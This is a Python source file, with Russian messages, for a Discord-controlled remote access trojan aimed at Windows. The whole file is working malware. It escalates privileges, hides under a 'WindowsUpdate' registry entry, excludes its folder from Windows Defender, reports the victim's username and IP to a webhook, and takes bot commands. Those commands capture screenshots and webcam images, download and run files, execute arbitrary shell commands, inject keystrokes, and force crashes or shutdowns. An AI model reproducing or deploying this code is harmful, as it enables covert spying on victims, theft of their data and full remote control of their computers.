import discord
from discord.ext import commands
import os
import pyautogui
import subprocess
import shutil
import ctypes
import win32com.client
import sys
import winreg
import psutil
import pygame
import asyncio
import cv2
import socket
import requests
import win32con
import win32process

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        program_path = os.path.abspath(sys.argv[0])
        program_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_ALL_ACCESS) as registry_key:
            winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, program_path)
        return True
    except Exception as e:
        print(f"Ошибка при добавлении скрипта в автозагрузку Windows: {e}")
        return False

def add_to_runonce():
    try:
        user_name = os.getlogin()
        appdata_path = os.path.join("C:\\Users", user_name, "AppData\\Roaming\\shellix")
        program_path = os.path.join(appdata_path, os.path.basename(sys.argv[0]))
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
        runonce_name = "WindowsUpdate"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_ALL_ACCESS) as registry_key:
            winreg.SetValueEx(registry_key, runonce_name, 0, winreg.REG_SZ, program_path)
        return True
    except Exception as e:
        print(f"Ошибка при добавлении скрипта в RunOnce: {e}")
        return False

def add_folder_to_antivirus_exclusions():
    try:
        user_name = os.getlogin()
        folder_path = os.path.join("C:\\Users", user_name, "AppData\\Roaming\\shellix")
        command = f"Add-MpPreference -ExclusionPath '{folder_path}'"
        process = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        if process.returncode == 0:
            print(f"Папка {folder_path} успешно добавлена в исключения антивируса.")
        else:
            print(f"Ошибка при добавлении папки {folder_path} в исключения антивируса: {process.stderr}")
    except Exception as e:
        print(f"Ошибка при добавлении папки в исключения антивируса: {e}")

def create_and_copy_to_shellix():
    try:
        user_name = os.getlogin()
        appdata_path = os.path.join("C:\\Users", user_name, "AppData\\Roaming\\shellix")
        os.makedirs(appdata_path, exist_ok=True)
        script_path = os.path.abspath(sys.argv[0])
        shutil.copy(script_path, appdata_path)
        print("Скрипт успешно скопирован в папку shellix.")
    except Exception as e:
        print(f"Ошибка при создании папки или копировании скрипта: {e}")

def run_as_admin():
    if is_admin():
        print("Административные права получены. Можно продолжить выполнение скрипта.")
        create_and_copy_to_shellix()
        startup_added = add_to_startup()
        runonce_added = add_to_runonce()
        add_folder_to_antivirus_exclusions()
        send_webhook_message(startup_added, runonce_added)
    else:
        print("Административные права не получены. Попытка запустить скрипт от имени администратора.")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        except Exception as e:
            print("Ошибка при запуске от имени администратора:", e)
            sys.exit(1)

def get_username():
    return os.getlogin()

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def send_webhook_message(startup_added, runonce_added):
    username = get_username()
    ip_address = get_ip()
    admin_privilege = "yes" if is_admin() else "no"
    startup_status = "yes" if startup_added else "no"
    runonce_status = "yes" if runonce_added else "no"
    message = f"```Скрипт был запущен\nUsername: {username}\nIP: {ip_address}\nAdmin Privilege: {admin_privilege}\nAdd to Run: {startup_status}\nAdd to RunOnce: {runonce_status}```"
    payload = {
        "content": message
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при отправке вебхука: {e}")

# Создание объекта бота с указанием намерений
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

# URL вашего вебхука
WEBHOOK_URL = "ENTER_YOUR_DISCORD_WEBHOOK_URL"

# Команда для снимка экрана
@bot.command()
async def screen(ctx):
    await ctx.send('Делаю скриншот...')
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.jpg')
    with open('screen.jpg', 'rb') as f:
        await ctx.send(file=discord.File(f))
    os.remove('screen.jpg')

@bot.command()
async def process(ctx):
    filename = 'processes.txt'
    with open(filename, 'w') as f:
        f.write("Список запущенных процессов:\n")
        for proc in psutil.process_iter():
            f.write(f"{proc.name()} (PID: {proc.pid})\n")

    await ctx.send(file=discord.File(filename))

@bot.command()
async def msg(ctx, *, text):
    await ctx.send(f'Отправляю сообщение: {text}')
    # Отображение сообщения с помощью MessageBox
    MessageBox = ctypes.windll.user32.MessageBoxW
    MessageBox(None, text, "Сообщение", 0x40)
    await ctx.send("Сообщение успешно выведено на экран.")

@bot.command()
async def upload(ctx):
    await ctx.send('Ожидаю загрузки файла...')
    message = await bot.wait_for('message', check=lambda m: m.attachments)
    attachment = message.attachments[0]
    await attachment.save(attachment.filename)
    os.startfile(attachment.filename)

@bot.command()
async def name(ctx):
    await ctx.send(f'Имя пользователя: {os.getlogin()}')

@bot.command()
async def mouse(ctx, count: int):
    for _ in range(count):
        x, y = pyautogui.size()
        pyautogui.moveTo(x//2, y//2, duration=0.5)
        pyautogui.click()
    await ctx.send(f'Мышь передвинута {count} раз и сделан клик')

@bot.command()
async def close(ctx, process_name: str):
    await ctx.send(f'Закрываю процесс: {process_name}')
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            proc.kill()

@bot.command()
async def cmd(ctx, count: int):
    await ctx.send(f'Открываю {count} cmd.exe...')
    for _ in range(count):
        os.system('start cmd')

@bot.command()
async def autorun(ctx):
    await ctx.send('Добавляю бота в автозагрузку...')
    startup_added = add_to_startup()
    if startup_added:
        await ctx.send('Бот добавлен в автозагрузку.')
    else:
        await ctx.send('Ошибка при добавлении бота в автозагрузку.')

@bot.command()
async def clickright(ctx, count: int):
    await ctx.send(f'Выполняю правый клик {count} раз...')
    for _ in range(count):
        pyautogui.rightClick()

@bot.command()
async def clickleft(ctx, count: int):
    await ctx.send(f'Выполняю левый клик {count} раз...')
    for _ in range(count):
        pyautogui.leftClick()

@bot.command()
async def keyboard(ctx, *, text: str):
    await ctx.send(f'Печатаю текст: {text}')
    pyautogui.typewrite(text)

@bot.command()
async def command(ctx):
    commands_list = [command.name for command in bot.commands]
    await ctx.send("Список всех команд:\n" + ", ".join(commands_list))

@bot.command()
async def cmdcode(ctx, *, command: str):
    await ctx.send(f'Выполняю команду в cmd.exe: {command}')
    subprocess.Popen(["cmd", "/c", command])

@bot.command()
async def crashsystem(ctx):
    if not is_admin():
        await ctx.send("Для выполнения этой команды требуются права администратора.")
        return
    
    try:
        await ctx.send("Выполняю команду для вызова синего экрана...")
        subprocess.run(["taskkill", "/IM", "svchost.exe", "/F"], check=True, shell=True)
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Ошибка при выполнении команды: {e}")

@bot.command()
async def addkey_a(ctx, *, path: str):
    if not os.path.exists(path):
        await ctx.send(f"Путь не существует: {path}")
        return

    await ctx.send(f'Добавляю {path} в исключения Windows Defender...')
    try:
        subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"], check=True)
        await ctx.send(f'{path} успешно добавлен в исключения Windows Defender.')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Ошибка при добавлении {path} в исключения Windows Defender: {e}')

@bot.command()
async def restart(ctx):
    if not is_admin():
        await ctx.send("Для выполнения этой команды требуются права администратора.")
        return
    await ctx.send("Перезагрузка компьютера...")
    subprocess.run(["shutdown", "/r", "/f", "/t", "0"])

@bot.command()
async def stopping(ctx):
    if not is_admin():
        await ctx.send("Для выполнения этой команды требуются права администратора.")
        return
    await ctx.send("Выключение компьютера...")
    subprocess.run(["shutdown", "/s", "/f", "/t", "0"])

@bot.command()
async def webcam(ctx):
    await ctx.send('Делаю снимок с камеры...')
    
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("Не удалось получить доступ к камере.")
        return

    ret, frame = cap.read()
    if not ret:
        await ctx.send("Не удалось сделать снимок.")
        return

    image_path = 'webcam.jpg'
    cv2.imwrite(image_path, frame)
    cap.release()

    with open(image_path, 'rb') as f:
        await ctx.send(file=discord.File(f))
    
    os.remove(image_path)
    
@bot.command()
async def display(ctx):
    await ctx.send('Ожидаю загрузки фото...')
    message = await bot.wait_for('message', check=lambda m: m.attachments)
    attachment = message.attachments[0]
    await attachment.save('wallpaper.jpg')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath('wallpaper.jpg'), 0)
    await ctx.send('Обои на рабочем столе успешно изменены')

# Команда для воспроизведения музыки
@bot.command()
async def music(ctx):
    await ctx.send('Ожидаю загрузки музыки...')
    message = await bot.wait_for('message', check=lambda m: m.attachments)
    attachment = message.attachments[0]
    music_path = os.path.join(os.getcwd(), attachment.filename)
    await attachment.save(music_path)
    
    pygame.mixer.init()
    pygame.mixer.music.load(music_path)
    pygame.mixer.music.play()
    await ctx.send(f'Воспроизвожу музыку: {attachment.filename}')

if __name__ == "__main__":
    run_as_admin()
    bot.run('ENTER_YOUR_DISCORD_BOT_TOKEN')
